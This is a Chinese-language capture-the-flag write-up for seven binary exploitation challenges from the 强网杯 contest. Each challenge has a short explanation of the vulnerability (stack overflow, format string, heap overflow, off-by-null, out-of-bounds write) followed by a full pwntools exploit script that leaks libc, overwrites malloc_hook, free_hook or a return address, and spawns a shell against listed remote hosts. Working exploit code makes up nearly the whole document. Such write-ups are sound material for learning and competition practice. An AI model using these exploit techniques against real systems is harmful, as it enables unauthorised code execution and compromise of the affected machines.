### babymessage - 强网先锋
case 2中溢出修改 rbp的末尾字节 然后退出程序可以有概率调用 start函数,此时m为4,故第二次回到主函数的时候可以在case 2溢出到ret_address,修改ret_address为set rdi=0x100 然后进入leave_message的地址,注意第二次溢出的rbp值需要保存有一个可写的地址,进入后则是一个简单的ret2libc
```python
from pwn import*
p = process('./main')
p = remote('123.56.170.202',21342)
elf =ELF('./main')
libc =ELF('./libc-2.27.so')
def menu(ch):
	p.sendlineafter('choice: ',str(ch))
menu(2)
p.sendafter('message:','FMYYFMYY' + '\x68')
menu(4)
menu(2)
p.sendafter('message:','FMYYFMYY' + p64(elf.bss() + 0x200) + p32(0x40098E))
pop_rdi_ret = 0x400AC3
p.sendafter('message:','FMYYFMYY' + p64(elf.bss() + 0x200) + p64(pop_rdi_ret) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(0x40098E))
libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - libc.sym['puts']
system = libc_base + libc.sym['system']
binsh = libc_base + libc.search('/bin/sh').next()

log.info('LIBC:\t' + hex(libc_base))
p.sendafter('message:','FMYYFMYY' + p64(elf.bss() + 0x200) + p64(pop_rdi_ret) + p64(binsh) + p64(system))
p.interactive()
```

### Siri - 强网先锋
一个简单的格式化字符串,leak了stack地址之后就是对上面的地址进行一个返回地址和保存的rbp进行一个修改,通过抬栈 执行 one_gadget
```python
from pwn import*
p = process('./main')
p = remote('123.56.170.202',12124)
libc = ELF('./libc-2.27.so')
p.sendlineafter('>>> ','Hey Siri!')
offset = 14
p.sendlineafter('>>> ','Remind me to  ' + 'BBBBAAAAAAAAStack:%46$pLIBC:%83$pPROC:%47$pCanary:%45$p')
p.recvuntil('Stack:')
stack = int(p.recv(14),16) - 288
log.info('Stack:\t' + hex(stack))
p.recvuntil('LIBC:')
libc_base = int(p.recv(14),16) - 231 - libc.sym['__libc_start_main']
log.info('LIBC:\t' + hex(libc_base))
p.recvuntil('PROC:')
proc_base = int(p.recv(14),16) - 0x144C
log.info('Proc:\t' + hex(proc_base))
p.recvuntil('Canary:')
canary = int(p.recv(18),16)
log.info('Canary:\t' + hex(canary))
pop_rdi_ret = proc_base  + 0x0152B
leave_ret = proc_base + 0x12E2
rce = libc_base + 0x10A45C
open_sys = libc_base + libc.sym['open']
read_sys = libc_base + libc.sym['read']
puts = libc_base + libc.sym['puts']

p.sendlineafter('>>> ','Hey Siri!')
off_1 = (((stack + 0x50)&0xFFFF))
off_2 = (leave_ret&0xFFFF)
#gdb.attach(p,'b *0x5555555552A2')
if off_1 > off_2:
	payload  = 'Remind me to ' + '%' + str((off_2 - 27)) + 'c%55$hn' + '%' + str((off_1 - off_2)) + 'c%56$hn'
	payload  = payload.ljust(0x38,'\x00')
	payload += p64(stack + 8) + p64(stack)
	payload += p64(rce)
else:
	payload  = 'Remind me to ' + '%' + str((off_1 - 27)) + 'c%55$hn' + '%' + str((off_2 - off_1)) + 'c%56$hn'
	payload  = payload.ljust(0x38,'\x00')
	payload += p64(stack) + p64(stack + 8)
	payload += p64(rce)
p.sendlineafter('>>> ',payload)
p.interactive()
```

### Just a Galgame - 强网先锋
如果top_chunk的size 不够申请的大小,就会另外开辟一个top_chunk,将原先top_chunk扔进unsorted bin,切割后拿到libc_base,在case 5有个read(0,0x4040A0,8);往栈上写一个地址,然乎case 2没有对 index 索引进行一个 检测 越界修改这个地址里面的内容,即可将malloc_hook写为rce
```python
from pwn import*
context.log_level ='DEBUG'
def menu(ch):
	p.sendlineafter('>> ',str(ch))
def new():
	menu(1)
def edit(index,name):
	menu(2)
	p.sendlineafter('idx >>',str(index))
	p.sendafter('movie name >> ',name)
def large():
	menu(3)
def show():
	menu(4)
def leave(say):
	menu(5)
	p.sendafter('QAQ\n',say)
p = process('./main')
p = remote('123.56.170.202',52114)
libc =ELF('./libc-2.27.so')
new()
edit(0,p64(0) + p64(0xD41))
large()
new()
show()
libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - libc.sym['__malloc_hook']  -0x10 - 1632
log.info('LIBC:\t' + hex(libc_base))
malloc_hook = libc_base + libc.sym['__malloc_hook']
rce = libc_base + 0x10A45C
leave(p64(malloc_hook - 0x60))
edit(8,p64(rce))
new()
p.interactive()
```
### babynotes - 强网先锋
因为在regset中 strcpy 可以导致堆溢出修改下一个块的size,则可构造 chunk overlap,然后往malloc_hook中写入rce
```python
from pwn import*
#context.log_level ='DEBUG'
def menu(ch):
	p.sendlineafter('>> ',str(ch))
def new(index,size):
	menu(1)
	p.sendlineafter('index:',str(index))
	p.sendlineafter('size:',str(size))
def show(index):
	menu(2)
	p.sendlineafter('index:',str(index))
def free(index):
	menu(3)
	p.sendlineafter('index:',str(index))
def edit(index,content):
	menu(4)
	p.sendlineafter('index:',str(index))
	p.sendafter('note:',content)
def Set(name,motto,age):
	p.sendafter('name:',name)
	p.sendafter('motto:',motto)
	p.sendlineafter('age:',str(age))
def check():
	menu(6)
p = process('./main')
libc =ELF('./libc-2.23.so')
p = remote('123.56.170.202',43121)
Set('FMYY','FAQ',0x21)
new(0,0x100)
new(1,0x18)
new(2,0x60)
new(3,0x60)
new(4,0x60)
free(0)
new(0,0x100)
show(0)
libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - 0x10 - 88 - libc.sym['__malloc_hook']
log.info('LIBC:\t' + hex(libc_base))
malloc_hook = libc_base + libc.sym['__malloc_hook']
rce= libc_base + 0xF1207
free(0)
free(1)
menu(5)
Set('U'*0x18,'FAQ',0xE1)
free(2)
new(0,0x60)
new(1,0x60) # 1 = 3
free(1)
free(0)
free(3)
new(3,0x60)
edit(3,p64(malloc_hook - 0x23))
new(0,0x60)
new(5,0x60)
new(1,0x60)
edit(1,'\x00'*0x13 + p64(rce))
free(0)
new(0,0x60)
p.interactive()
```

### easypwn
首先一个off by null 可以构造一个堆块重叠,然后爆破半个字节并利用unsorted bin attack 攻击 global_max_fast,之后则是一个 free对应大小的块 越界后覆盖stdout的read_end 和 write_ptr指针,并令覆盖的内容相同 即可 leak libc_base,之后则是一个攻击 malloc_hook写入rce的ez操作
```python
from pwn import*
#context.log_level ='DEBUG'
def menu(ch):
	p.sendlineafter('Your choice:',str(ch))
def new(size):
	menu(1)
	p.sendlineafter('size:',str(size))
def edit(index,content):
	menu(2)
	p.sendlineafter('idx:',str(index))
	p.sendafter('content:',	content)
def free(index):
	menu(3)
	p.sendlineafter('idx:',str(index))
def F(index):
	sleep(0.05)
	p.sendline('3')
	sleep(0.05)
	p.sendline(str(index))
def E(index,content):
	sleep(0.05)
	p.sendline('2')
	sleep(0.05)
	p.sendline(str(index))
	sleep(0.05)
	p.send(content)
	
while True:
	p  = process('./main')
	libc =ELF('./libc-2.23.so')
#	p = remote('39.101.184.181',10000)
	try:
		new(0x18)	#0
		new(0x2F8)  #1
		new(0x2F8)  #2
		new(0x380)  #3
		new(0x380)  #4
		new(0x380)  #5
		new(0x380)  #6
		new(0x380)  #7
		edit(7,(p64(0) + p64(0x21))*0x38)
		new(0x18)   #8
		free(0)
		edit(1,'\x00'*0x2F0 + p64(0x320))
		free(2)
		####################
		new(0x18)   #0
		new(0x78)   #2
		new(0x78)   #9
		new(0xF8)   #10
		new(0x88)   #11
		new(0x68)   #12
		new(0x2F8)  #13

		free(2)
		edit(9,'\x00'*0x70 + p64(0x100))
		free(10)
		new(0x78) #2
		new(0x78) #10 = 9
		new(0xF8) #14


		free(2)
		edit(1,p64(0) + '\xE8\x37\n')
		new(0x70)
		edit(1,'\x00'*0x78 + p64(0x1631) +  '\n')
		free(9)

		E(1,'\x00'*0x78 + p64(0x1651) + '\n')
		F(10)
		libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - 131 - libc.sym['_IO_2_1_stdout_']
		log.info('LIBC:\t' + hex(libc_base))
		malloc_hook = libc_base + libc.sym['__malloc_hook']
		rce = libc_base + 0xF0364
		free(12)
		edit(1,'\x00'*0x288 + p64(0x71) + p64(malloc_hook - 0x23) + '\n')
		new(0x60) #9
		new(0x60) #10
		edit(10,'\x00'*0x13 + p64(rce) + '\n')
		new(0x10)
		break
	except:
		p.close()
		continue
p.interactive()
```

### oldschool
审计一下给的源文件即可知道,在mmap_edit中因为 < 和 > 符号搞错了,导致越界,往一个地址写入一个64位长的整型变量,此时只需要leak libc,然后计算出此偏移,因为mmap_edit时的指针类型为int类型,所以 需要之前 offset>>2 才是正确的offset,之后就是往free_hook写入一个system,free('/bin/sh')即可getshell
```python
from pwn import*
context.log_level ='DEBUG'
def menu(ch):
	p.sendlineafter('Your choice:',str(ch))
def new(index,size):
	menu(1)
	p.sendlineafter('Index: ',str(index))
	p.sendlineafter('Size: ',str(size))
def edit(index,content):
	menu(2)
	p.sendlineafter('Index: ',str(index))
	p.sendafter('Content: ',content)
def show(index):
	menu(3)
	p.sendlineafter('Index: ',str(index))
def free(index):
	menu(4)
	p.sendlineafter('Index: ',str(index))
def m_new(index):
	menu(6)
	p.sendlineafter('start: ',str(index))
def m_edit(index,value):
	menu(7)
	p.sendlineafter('Index: ',str(index))
	p.sendlineafter('Value: ',str(value))
def m_free():
	menu(8)
p = process('./main')
libc =ELF('./libc-2.27.so')
p = remote('106.14.214.3',2333)
for i in range(8):
	new(i,0x100)
for i in range(8):
	free(7 - i)
for i in range(7):
	new(i + 1,0x100)

show(1)
p.recvuntil('Content: ')
heap_base = u32(p.recv(4)) - 0x380
log.info('HEAP:\t' + hex(heap_base))

new(0,0x78)
new(8,0x78)
edit(1,'/bin/sh\n')
show(0)
libc_base = u32(p.recvuntil('\xF7')[-4:]) - libc.sym['__malloc_hook'] - 0xD8
system = libc_base + libc.sym['system']
free_hook = libc_base + libc.sym['__free_hook']
log.info('LIBC:\t' + hex(libc_base))
rce = libc_base + 0x3D130
m_new(0)
address = ((free_hook - 0xE0000000)>>2)
m_edit(address,system)
free(1)

p.interactive()
```
### direct
向上溢出,修改chunk的size,然后导致了堆块重叠,利用tcache dup把readdir保存有目录文件名称的附近的块申请下来,然后在向上溢出修改一下此块的size和next_chunk的prevsize和size域,再将此块放进unsorted bin中,则在closefile的选项中即可leak 出libc,之后则是简单的攻击 free_hook,往hook中写一个rce或者system的地址即可
```python
from pwn import*
context.log_level = 'DEBUG'
def menu(ch):
	p.sendlineafter('Your choice: ',str(ch))
def new(index,size):
	menu(1)
	p.sendlineafter('Index:',str(index))
	p.sendlineafter('Size: ',str(size))
def edit(index,offset,size,content):
	menu(2)
	p.sendlineafter('Index: ',str(index))
	p.sendlineafter('Offset: ',str(offset))
	p.sendlineafter('Size: ',str(size))
	p.sendafter('Content: ',content)
def free(index):
	menu(3)
	p.sendlineafter('Index: ',str(index))
def openfile():
	menu(4)
def closefile():
	menu(5)
while True:
	p = process('./main')
	libc =ELF('./libc-2.27.so.bak')
	p = remote('106.14.214.3',1912)
	try:
		for i in range(8):
			new(i,0xF0)
		openfile()
		closefile()
		#gdb.attach(p,'b *0x555555554D7E')
		edit(0,-0x10,0x100,p64(0) + p64(0x501))
		free(0)
		new(0,0xF0)
		new(8,0xF0)
		new(9,0xF0)
		new(10,0xF0)
		new(11,0xF0)
		new(12,0xF0)
		free(5)
		free(6)
		edit(7,-0x100,0x100,'\xC0\xAA')
		new(6,0xF0)
		new(5,0xF0)
		free(7)
		free(6)
		free(4)
		free(3)
		free(2)
		free(1)
		free(0)
		edit(12,-0x7FE8,0x7FE8,p64(0x101) + 'FMYY' + '\x00'*(0xF0-4) + p64(0x100) + p64(0x21) + '\x00'*0x18 + p64(0x21))
		free(5)
		edit(12,-0x7FF0,0x7FF8,'F'*0x10)
		menu(5)
		libc_base = u64(p.recvuntil('\x7F',timeout=0.2)[-6:].ljust(8,'\x00')) - libc.sym['__malloc_hook'] - 0x10 - 0x60
		log.info('LIBC:\t' + hex(libc_base))
		free_hook = libc_base + libc.sym['__free_hook']
		system = libc_base + libc.sym['system']
		new(7,0xF0)
		free(8)
		new(0,0xF0)
		edit(0,0,0x10,p64(free_hook))
		new(8,0xF0)
		edit(8,0,0x10,'/bin/sh\x00')
		new(1,0xF0)
		edit(1,0,0x10,p64(system))
		free(8)
		break
	except:
		p.close()
		continue
p.interactive()
```
